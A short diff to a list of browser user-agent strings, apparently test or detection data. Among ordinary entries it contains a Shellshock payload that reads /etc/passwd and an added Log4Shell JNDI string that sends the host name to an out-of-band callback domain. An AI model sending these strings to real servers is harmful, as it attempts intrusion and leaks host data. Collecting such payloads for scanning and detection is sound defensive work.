@@ -7441,3 +7441,4 @@ Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MAG
 Mozilla/5.0 (Windows NT 6.2; WOW64 AppleWebKit/537.21 (KHTML, like Gecko) PokerGameClient Safari/537.21)
 Mozilla/5.0 (Windows NT 6.1; Trident/7.0; FunWebProducts; rv:11.0 like Gecko)
 () { :;( }; echo ; echo ; /bin/cat /etc/passwd)
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d3qe7gf49vd8v4f7qkogtj3i36y5k83py.oast.site}
